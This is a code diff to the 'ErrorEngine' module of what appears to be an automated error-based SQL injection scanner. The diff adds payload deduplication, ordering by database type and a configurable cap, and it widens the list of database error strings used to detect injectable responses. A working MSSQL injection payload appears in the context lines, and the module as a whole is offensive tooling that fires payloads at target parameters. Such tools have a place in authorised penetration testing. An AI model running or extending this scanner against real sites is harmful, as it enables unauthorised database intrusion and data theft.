@@ -4,6 +4,7 @@ Error-Based SQL Injection Engine
 
 import os
 from utils.http_client import HttpClient
+from config import MAX_PAYLOADS_PER_TEST, SKIP_DUPLICATE_PAYLOADS, NORMALIZE_PAYLOADS, SMART_PAYLOAD_ORDERING
 
 class ErrorEngine:
     def __init__(self):
@@ -12,7 +13,7 @@ class ErrorEngine:
         self.payloads = self._load_payloads()
     
     def _load_payloads(self):
-        """Load error-based payloads from file"""
+        """Load error-based payloads from file with smart handling"""
         default_payloads = [
             # MSSQL Error-based
             "' AND 1=CONVERT(int, (SELECT @@version))--",
@@ -65,13 +66,46 @@ class ErrorEngine:
             if os.path.exists(self.payloads_file):
                 with open(self.payloads_file, 'r', encoding='utf-8') as f:
                     payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-                return payloads[:35]
+                
+                # Normalize payloads if enabled
+                if NORMALIZE_PAYLOADS:
+                    payloads = [' '.join(p.split()) for p in payloads]
+                
+                # Remove duplicates if enabled
+                if SKIP_DUPLICATE_PAYLOADS:
+                    payloads = list(dict.fromkeys(payloads))
+                
+                # Smart ordering
+                if SMART_PAYLOAD_ORDERING:
+                    payloads = self._order_payloads(payloads)
+                
+                # Apply limit if specified
+                if MAX_PAYLOADS_PER_TEST:
+                    payloads = payloads[:MAX_PAYLOADS_PER_TEST]
+                
+                print(f"   Loaded {len(payloads)} unique error payloads")
+                return payloads
             else:
                 print(f"   Payload file not found: {self.payloads_file}, using defaults")
                 return default_payloads
         except Exception as e:
             print(f"   Error loading payloads: {e}, using defaults")
             return default_payloads
+    
+    def _order_payloads(self, payloads):
+        """Order payloads by database type and complexity"""
+        def payload_priority(payload):
+            # Prioritize by database type (MySQL first, then generic)
+            if 'extractvalue' in payload.lower() or 'updatexml' in payload.lower():
+                return 0  # MySQL
+            elif 'convert' in payload.lower():
+                return 1  # MSSQL
+            elif 'cast' in payload.lower() and 'version()' in payload.lower():
+                return 2  # PostgreSQL
+            else:
+                return 3  # Generic/Other
+        
+        return sorted(payloads, key=payload_priority)
     
     def test(self, param, url):
         """Test for error-based SQL injection"""
@@ -103,33 +137,44 @@ class ErrorEngine:
             return None
     
     def _detect_database_errors(self, response, baseline_response):
-        """Detect database error messages in response"""
+        """Detect database error messages in response with enhanced pattern matching"""
         if not response:
             return False
             
-        # Database-specific error indicators
+        # Expanded database-specific error indicators
         error_indicators = [
             # MySQL
             "mysql", "mysqli", "mysql_fetch", "you have an error in your sql",
             "mysql_result", "mysql_num_rows", "mysql_", "mysqli_",
+            "mariadb", "check the manual that corresponds",
             
             # MSSQL
             "microsoft ole db", "sql server", "odbc driver", "convert",
             "microsoft sql", "sqlserver", "system.data.sqlclient",
+            "unclosed quotation mark", "incorrect syntax near",
             
             # Oracle
             "ora-", "oracle", "pl/sql", "oci", "tns", "oracle driver",
+            "quoted string not properly terminated",
             
             # PostgreSQL
             "postgresql", "pg_", "postgres", "psql", "pqsql",
+            "unterminated quoted string",
             
             # SQLite
             "sqlite", "sqlite3", "database disk image is malformed",
+            "near \"", "unrecognized token",
             
             # General SQL
             "sql syntax", "warning:", "error", "exception", "unclosed",
             "syntax error", "unexpected", "database", "query failed",
-            "invalid query", "sql command", "db error", "pdo exception"
+            "invalid query", "sql command", "db error", "pdo exception",
+            "quoted", "unterminated", "token", "parse error",
+            
+            # Additional patterns for new payloads
+            "division by zero", "type mismatch", "conversion failed",
+            "invalid column", "unknown column", "ambiguous column",
+            "operand should contain", "xpath", "extractvalue", "updatexml"
         ]
         
         response_lower = response.lower()
@@ -143,4 +188,5 @@ class ErrorEngine:
             baseline_lower = baseline_response.lower()
             baseline_errors = sum(1 for indicator in error_indicators if indicator in baseline_lower)
         
-        return error_count > baseline_errors + 2  # Significant increase in errors
+        # Enhanced detection: lower threshold but require significant difference
+        return error_count > baseline_errors + 1  # Even 2 more error indicators is significant
